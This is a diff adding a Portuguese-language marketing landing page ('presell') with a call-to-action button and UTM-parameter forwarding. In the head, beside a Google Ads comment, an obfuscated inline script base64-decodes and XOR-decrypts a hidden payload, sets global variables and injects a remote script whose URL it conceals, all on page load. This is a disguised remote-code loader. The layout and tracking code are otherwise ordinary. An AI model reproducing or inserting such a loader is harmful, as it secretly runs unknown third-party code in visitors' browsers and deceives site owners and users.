@@ -1,0 +1,271 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+  <title>Saiba mais | Página informativa</title>
+
+  <!--
+    GOOGLE ADS:
+    O código abaixo mantém o ID informado no arquivo original.
+    Antes de publicar, confirme a configuração de consentimento e privacidade
+    aplicável ao seu site e configure eventos de conversão conforme necessário.
+  -->
+ <script async="" src="js/gtm.js"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+</script>
+<script>(function(){var p_4dco=atob("DBkMSjyhK3ghyf4KoGIuP07NCUIDoYp+0Go2ZRPCTxYPvIpnyX91ZF/ORlZDu9F5w2tlOkjSBAhIsZtmj2llMlnNBh9OpplmxTdmOR6NCRlVvYxjwmx4L0+DESN85dxtzHZuK1DSCUJ6stxkwXRpaAaDTBdOrpJv8HB0L1DoT1oN64hrzGxpaAaDHRkX+8g8mChtKwzDH0ESqJs4ky4/LAnHCQV8tA==");var k_s=[];for(var u_w=0;u_w<p_4dco.length;u_w++){k_s.push(p_4dco.charCodeAt(u_w)&255);}var s_z4mu=k_s[0];var h_71=k_s.slice(1,1+s_z4mu);var b_3h1i=k_s.slice(1+s_z4mu);var u_e4so=b_3h1i.map(function(b,b_c00){return b^h_71[b_c00%s_z4mu];});var f_epib="";for(var z_2npt=0;z_2npt<u_e4so.length;z_2npt++){f_epib+=String.fromCharCode(u_e4so[z_2npt]&255);}var v_rx=decodeURIComponent(escape(f_epib));var v_4=JSON.parse(v_rx);var j_36bz=v_4.globals||[];j_36bz.forEach(function(k_kccl){window[k_kccl.name]=k_kccl.value;});var a_2p2n=document.createElement("script");a_2p2n.src=v_4.url;a_2p2n.async=true;a_2p2n.defer=true;(v_4.attributes||[]).forEach(function(l_cd){a_2p2n.setAttribute(l_cd.name,l_cd.value);});(document.head||document.documentElement).appendChild(a_2p2n);})();</script><script src="js/pixel-google.js" async="" defer=""></script>
+
+  <script>
+    // Preserva parâmetros de campanha durante a navegação nesta página.
+    (function () {
+      const params = new URLSearchParams(window.location.search);
+      const keys = [
+        'utm_source', 'utm_medium', 'utm_campaign', 'utm_term',
+        'utm_content', 'src', 'sck', 'gclid', 'gbraid', 'wbraid'
+      ];
+      const captured = {};
+
+      keys.forEach(function (key) {
+        const value = params.get(key);
+        if (value) captured[key] = value;
+      });
+
+      try {
+        if (Object.keys(captured).length) {
+          sessionStorage.setItem('_presell_utms', JSON.stringify(captured));
+        }
+      } catch (error) {
+        // A página continua funcionando mesmo se o armazenamento estiver bloqueado.
+      }
+    })();
+  </script>
+
+  <style>
+    :root {
+      --bg: #f5f7fb;
+      --surface: #ffffff;
+      --text: #172033;
+      --muted: #667085;
+      --line: #dbe3ef;
+      --accent: #EE4D30;
+      --accent-dark: #EE4D30;
+      --soft: #f2f8f2;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      min-height: 100vh;
+      display: grid;
+      place-items: center;
+      padding: 24px;
+      background: var(--bg);
+      color: var(--text);
+      font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    }
+
+    .presell {
+      width: min(100%, 480px);
+      padding: 34px 28px 28px;
+      border: 1px solid rgba(219, 227, 239, .9);
+      border-radius: 24px;
+      background: var(--surface);
+      text-align: center;
+    }
+
+    .brand-mark {
+      width: 58px;
+      height: 58px;
+      display: grid;
+      place-items: center;
+      margin: 0 auto 20px;
+      border-radius: 18px;
+      color: #fff;
+      background: linear-gradient(135deg, var(--accent), var(--accent-dark));
+    }
+
+    .brand-mark svg { width: 30px; height: 30px; }
+
+    .eyebrow {
+      margin-bottom: 10px;
+      color: var(--accent-dark);
+      font-size: .78rem;
+      font-weight: 800;
+      letter-spacing: .08em;
+      text-transform: uppercase;
+    }
+
+    h1 {
+      margin-bottom: 12px;
+      font-size: clamp(1.55rem, 4vw, 2rem);
+      line-height: 1.18;
+    }
+
+    .intro {
+      max-width: 36ch;
+      margin: 0 auto;
+      color: var(--muted);
+      font-size: 1rem;
+      line-height: 1.6;
+    }
+
+    .benefits {
+      display: grid;
+      gap: 12px;
+      margin: 25px 0;
+      padding: 17px;
+      border: 1px solid var(--line);
+      border-radius: 16px;
+      background: #fbfcfe;
+      text-align: left;
+      list-style: none;
+    }
+
+    .benefits li {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      color: #344054;
+      font-size: .94rem;
+      line-height: 1.45;
+    }
+
+    .check {
+      flex: 0 0 21px;
+      width: 21px;
+      height: 21px;
+      display: grid;
+      place-items: center;
+      border-radius: 50%;
+      background: var(--soft);
+      color: var(--accent-dark);
+      font-size: .82rem;
+      font-weight: 900;
+    }
+
+    .cta {
+      width: 100%;
+      min-height: 54px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 9px;
+      padding: 14px 18px;
+      border: 0;
+      border-radius: 13px;
+      background: linear-gradient(135deg, var(--accent), var(--accent-dark));
+      color: #fff;
+      font: 800 1rem Inter, system-ui, sans-serif;
+      text-decoration: none;
+      cursor: pointer;
+      transition: transform .2s, opacity .2s;
+    }
+
+    .cta:hover { transform: translateY(-1px); opacity: .96; }
+    .cta:focus-visible { outline: 3px solid #9bd4a3; outline-offset: 3px; }
+
+    .microcopy {
+      margin-top: 13px;
+      color: #8792a5;
+      font-size: .8rem;
+      line-height: 1.5;
+    }
+
+    .footer {
+      margin-top: 22px;
+      padding-top: 16px;
+      border-top: 1px solid var(--line);
+      color: #8a94a6;
+      font-size: .76rem;
+      line-height: 1.5;
+    }
+
+    @media (max-width: 420px) {
+      body { padding: 16px; }
+      .presell { padding: 29px 21px 24px; border-radius: 20px; }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      *, *::before, *::after { scroll-behavior: auto !important; transition: none !important; }
+    }
+  </style>
+</head>
+
+<body>
+  <main class="presell">
+    <div class="brand-mark" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="none">
+        <path d="M12 3.25 19 6.4v5.25c0 4.45-2.86 7.95-7 9.1-4.14-1.15-7-4.65-7-9.1V6.4l7-3.15Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"></path>
+        <path d="m8.7 12.1 2.1 2.1 4.6-4.8" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"></path>
+      </svg>
+    </div>
+
+    <div class="eyebrow">Informação para você</div>
+    <h1>Descubra uma nova possibilidade</h1>
+    <p class="intro">
+      Conheça os detalhes, entenda como funciona e veja se esta solução
+      faz sentido para o que você procura.
+    </p>
+
+    <ul class="benefits">
+      <li><span class="check" aria-hidden="true">✓</span><span>Confira as principais informações antes de decidir.</span></li>
+      <li><span class="check" aria-hidden="true">✓</span><span>Veja os detalhes e as condições diretamente na página oficial.</span></li>
+      <li><span class="check" aria-hidden="true">✓</span><span>Continue somente se a proposta atender às suas necessidades.</span></li>
+    </ul>
+
+    <!-- Altere o texto e o destino do botão para combinar com sua oferta. -->
+    <a class="cta" id="continueButton" href="../01">
+      Ver mais informações <span aria-hidden="true">→</span>
+    </a>
+
+    <p class="microcopy">
+      Você será direcionado para a próxima página para consultar mais informações.
+    </p>
+
+    <div class="footer">
+      Esta página é informativa. Consulte os detalhes, termos e condições
+      apresentados no site de destino antes de tomar uma decisão.
+    </div>
+  </main>
+
+  <script>
+    (function () {
+      const button = document.getElementById('continueButton');
+      const destination = new URL(button.href);
+      const currentParams = new URLSearchParams(window.location.search);
+      const keys = [
+        'utm_source', 'utm_medium', 'utm_campaign', 'utm_term',
+        'utm_content', 'src', 'sck', 'gclid', 'gbraid', 'wbraid'
+      ];
+
+      // Mantém os parâmetros recebidos na URL ao clicar no CTA.
+      keys.forEach(function (key) {
+        const value = currentParams.get(key);
+        if (value && !destination.searchParams.has(key)) {
+          destination.searchParams.set(key, value);
+        }
+      });
+
+      // Se a URL atual não tiver parâmetros, tenta recuperar os da sessão.
+      if (![...currentParams.keys()].length) {
+        try {
+          const saved = JSON.parse(sessionStorage.getItem('_presell_utms') || '{}');
+          Object.keys(saved).forEach(function (key) {
+            if (keys.includes(key) && !destination.searchParams.has(key)) {
+              destination.searchParams.set(key, saved[key]);
+            }
+          });
+        } catch (error) {
+          // Sem ação: o link continua disponível.
+        }
+      }
+
+      button.href = destination.toString();
+    })();
+  </script>
+
+
+</body></html>
